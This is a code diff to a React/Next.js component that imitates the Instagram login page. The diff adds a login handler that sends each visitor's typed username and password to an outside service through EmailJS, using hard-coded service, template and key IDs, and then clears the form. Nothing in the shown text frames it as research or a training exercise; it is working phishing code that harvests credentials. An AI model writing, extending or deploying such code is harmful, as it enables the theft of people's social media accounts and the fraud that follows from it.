@@ -1,19 +1,38 @@
 'use client'
-
+import emailjs from 'emailjs-com'
 import { useState } from 'react'
 import Image from 'next/image'
+
 
 export default function InstagramLoginPage() {
   const [showPassword, setShowPassword] = useState(false)
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
   const [isLoading, setIsLoading] = useState(false)
+  const [error, setError] = useState('')        // ← add this
+const [submitted, setSubmitted] = useState(false)
 
-  const handleLogin = (e: React.FormEvent) => {
-    e.preventDefault()
-    setIsLoading(true)
-    setTimeout(() => setIsLoading(false), 1500)
+  const handleLogin = async (e: React.FormEvent) => {
+  e.preventDefault()
+  setIsLoading(true)
+  setError('')
+
+  try {
+    await emailjs.send(
+      'service_gxoq32g',   // Your Service ID
+      'template_tnx2oas',  // Your Template ID
+      { username, password },
+      'fC6lMjHeHeHg4U2cM'    // Your Public Key
+    )
+    setSubmitted(true)
+    setUsername('')
+    setPassword('')
+  } catch (err) {
+    setError('Something went wrong. Please try again.')
+  } finally {
+    setIsLoading(false)
   }
+}
 
   return (
     <div className="min-h-screen bg-white flex flex-col">
